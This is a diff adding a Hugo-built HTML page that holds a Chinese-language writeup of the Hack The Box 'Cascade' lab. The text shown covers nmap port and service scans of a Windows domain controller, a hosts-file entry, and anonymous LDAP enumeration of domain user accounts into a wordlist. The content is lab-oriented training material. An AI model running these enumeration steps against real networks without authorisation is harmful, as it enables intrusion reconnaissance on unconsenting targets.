@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Enil ">
+<meta name="description" content="Nmap 端口扫描 使用 Nmap 扫描开放的 TCP 端口。
+┌──(kali㉿kali)-[~/Work/Kali/Cascade] └─$ sudo nmap --min-rate 10000 -p- 10.129.25.165 -oA Nmap/ports Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-16 22:23 -0400 Nmap scan report for 10.129.25.165 Host is up (0.11s latency). Not shown: 65520 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open **msrpc** 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds 提取端口做备用。
+" />
+<meta name="keywords" content=", Hack, HTB, Writeup, LDAP, SMB, 逆向" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/posts/htb-cascade-writeup/" />
+
+
+    <title>
+        
+            HTB-Cascade Writeup :: Welcome My Hack&#39;s Blog 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.ab5336003ba331300318b49292c672210905baf1ef5410a739f647e70c8808fa.css" integrity="sha256-q1M2ADujMTADGLSSksZyIQkFuvHvVBCnOfZH5wyICPo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="HTB-Cascade Writeup">
+  <meta itemprop="description" content="Nmap 端口扫描 使用 Nmap 扫描开放的 TCP 端口。
+┌──(kali㉿kali)-[~/Work/Kali/Cascade] └─$ sudo nmap --min-rate 10000 -p- 10.129.25.165 -oA Nmap/ports Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-16 22:23 -0400 Nmap scan report for 10.129.25.165 Host is up (0.11s latency). Not shown: 65520 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open **msrpc** 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds 提取端口做备用。">
+  <meta itemprop="datePublished" content="2026-08-19T14:00:00+08:00">
+  <meta itemprop="dateModified" content="2026-08-19T14:00:00+08:00">
+  <meta itemprop="wordCount" content="3298">
+  <meta itemprop="keywords" content="Hack,HTB,Writeup,LDAP,SMB,逆向">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB-Cascade Writeup">
+  <meta name="twitter:description" content="Nmap 端口扫描 使用 Nmap 扫描开放的 TCP 端口。
+┌──(kali㉿kali)-[~/Work/Kali/Cascade] └─$ sudo nmap --min-rate 10000 -p- 10.129.25.165 -oA Nmap/ports Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-16 22:23 -0400 Nmap scan report for 10.129.25.165 Host is up (0.11s latency). Not shown: 65520 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open **msrpc** 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds 提取端口做备用。">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2026-08-19 14:00:00 &#43;0800 CST" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/english-articles/">English Articles</a></li><li><a href="/long-articles/">长文章</a></li><li><a href="/posts/">文章</a></li><li><a href="/tags/">标签</a></li><li><a href="/tools/">工具专区</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        16 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="http://localhost:1313/posts/htb-cascade-writeup/">HTB-Cascade Writeup</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap-端口扫描">Nmap 端口扫描</a></li>
+    <li><a href="#nmap-详细信息扫描">Nmap 详细信息扫描</a></li>
+    <li><a href="#ldap-探索">LDAP 探索</a></li>
+    <li><a href="#smb-探索">SMB 探索</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <h2 id="nmap-端口扫描">Nmap 端口扫描</h2>
+<p>使用 Nmap 扫描开放的 TCP 端口。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.25.165 -oA Nmap/ports
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-08-16 22:23 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.25.165
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65520</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp    open  domain
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open  **msrpc**
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown
+</span></span><span style="display:flex;"><span>49157/tcp open  unknown
+</span></span><span style="display:flex;"><span>49158/tcp open  unknown
+</span></span><span style="display:flex;"><span>49165/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.48 seconds
+</span></span></code></pre></div><p>提取端口做备用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ grep open Nmap/ports.nmap | awk -F <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span> | paste -sd <span style="color:#e6db74">&#39;,&#39;</span>
+</span></span><span style="display:flex;"><span>53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165
+</span></span></code></pre></div><h2 id="nmap-详细信息扫描">Nmap 详细信息扫描</h2>
+<p>执行 Nmap 详细信息扫描。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165 10.129.25.165 -oA Nmap/detail_scan 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-08-16 22:31 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.25.165
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| dns-nsid: 
+</span></span><span style="display:flex;"><span>|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2026-08-17 02:31:01Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49158/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49165/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose|phone|specialized
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2008|7|Vista|Phone|2012|8.1 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows <span style="color:#ae81ff">7</span> SP1 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Vista or Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Embedded Standard <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-08-17T02:31:57
+</span></span><span style="display:flex;"><span>|_  start_date: 2026-08-17T02:02:43
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2.1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: -32s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 105.47 seconds
+</span></span></code></pre></div><p>看结果应该是一台 Windows 服务器，解析域名到 hosts 文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Casecade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo bash -c <span style="color:#e6db74">&#39;echo &#34;10.129.25.165 cascade.local&#34; &gt;&gt; /etc/hosts&#39;</span>                                 
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                                             
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Casecade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tail -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.25.165 cascade.local
+</span></span></code></pre></div><h2 id="ldap-探索">LDAP 探索</h2>
+<p>执行 ldap 匿名探测，发现很多用户。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ldapsearch -x -H ldap://10.129.26.199 -b <span style="color:#e6db74">&#34;dc=cascade,dc=local&#34;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span> sAMAccountName
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># extended LDIF</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># LDAPv3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># base &lt;dc=cascade,dc=local&gt; with scope subtree</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter: (objectClass=user)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># requesting: sAMAccountName </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CascGuest, Users, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>CascGuest,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: CascGuest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CASC-DC1, Domain Controllers, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>CASC-DC1,OU<span style="color:#f92672">=</span>Domain Controllers,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: CASC-DC1$
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ArkSvc, Services, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>ArkSvc,OU<span style="color:#f92672">=</span>Services,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: arksvc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Steve Smith, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Steve Smith,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: s.smith
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ryan Thompson, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Ryan Thompson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: r.thompson
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Util, Services, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Util,OU<span style="color:#f92672">=</span>Services,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: util
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># James Wakefield, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>James Wakefield,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: j.wakefield
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stephanie Hickson, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Stephanie Hickson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: s.hickson
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># John Goodhand, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>John Goodhand,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: j.goodhand
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Adrian Turnbull, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Adrian Turnbull,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: a.turnbull
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Edward Crowe, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Edward Crowe,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: e.crowe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ben Hanson, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Ben Hanson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: b.hanson
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># David Burman, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>David Burman,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: d.burman
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># BackupSvc, Services, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>BackupSvc,OU<span style="color:#f92672">=</span>Services,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: BackupSvc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Joseph Allen, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Joseph Allen,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: j.allen
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ian Croft, Users, UK, cascade.local</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Ian Croft,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>sAMAccountName: i.croft
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># search reference</span>
+</span></span><span style="display:flex;"><span>ref: ldap://ForestDnsZones.cascade.local/DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># search reference</span>
+</span></span><span style="display:flex;"><span>ref: ldap://DomainDnsZones.cascade.local/DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># search reference</span>
+</span></span><span style="display:flex;"><span>ref: ldap://cascade.local/CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># search result</span>
+</span></span><span style="display:flex;"><span>search: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>result: <span style="color:#ae81ff">0</span> Success
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 20</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numEntries: 16</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numReferences: 3</span>
+</span></span></code></pre></div><p>将用户名保存为一个字典做备用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/Users<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat users        
+</span></span><span style="display:flex;"><span>CascGuest
+</span></span><span style="display:flex;"><span>CASC-DC1$
+</span></span><span style="display:flex;"><span>arksvc
+</span></span><span style="display:flex;"><span>s.smith
+</span></span><span style="display:flex;"><span>r.thompson
+</span></span><span style="display:flex;"><span>util
+</span></span><span style="display:flex;"><span>j.wakefield
+</span></span><span style="display:flex;"><span>s.hickson
+</span></span><span style="display:flex;"><span>j.goodhand
+</span></span><span style="display:flex;"><span>a.turnbull
+</span></span><span style="display:flex;"><span>e.crowe
+</span></span><span style="display:flex;"><span>b.hanson
+</span></span><span style="display:flex;"><span>d.burman
+</span></span><span style="display:flex;"><span>BackupSvc
+</span></span><span style="display:flex;"><span>j.allen
+</span></span><span style="display:flex;"><span>i.croft
+</span></span></code></pre></div><p>执行更详细的探测。</p>
